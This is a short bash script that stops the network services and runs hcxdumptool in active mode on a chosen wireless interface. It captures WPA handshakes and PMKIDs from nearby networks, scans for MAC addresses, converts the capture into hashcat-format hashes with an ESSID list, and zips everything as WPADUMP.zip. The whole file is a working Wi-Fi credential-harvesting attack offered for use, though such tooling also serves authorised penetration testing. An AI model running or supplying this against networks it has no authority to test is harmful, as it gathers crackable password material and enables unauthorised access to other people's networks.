#!/usr/bin/bash

WLAN=$1

mkdir OUTPUT
mkdir OUTPUT/LOGS

echo "-----STOPPING SERVICES-----"
sudo systemctl stop networking.service
sudo systemctl stop wpa_supplicant.service

echo "-----DUMPING-----"
sudo timeout 4m sudo hcxdumptool -i $WLAN -o OUTPUT/dumpfile.pcapng --active_beacon --enable_status=15 > OUTPUT/LOGS/dump.log

echo "-----GETTING MAC ADDRESSES-----"
sudo timeout 2m sudo hcxdumptool --do_rcascan -i $WLAN > OUTPUT/LOGS/macs.log

echo "-----RESTARTING SERVICES-----"
sudo systemctl start networking.service
sudo systemctl start wpa_supplicant.service

echo "-----GENERATING HASHES-----"
hcxpcapngtool -o OUTPUT/hashes.hc22000 -E OUTPUT/essidlist OUTPUT/dumpfile.pcapng > OUTPUT/LOGS/genhash.log


echo "-----ZIPPING PACKAGE-----"
zip -r WPADUMP.zip OUTPUT/
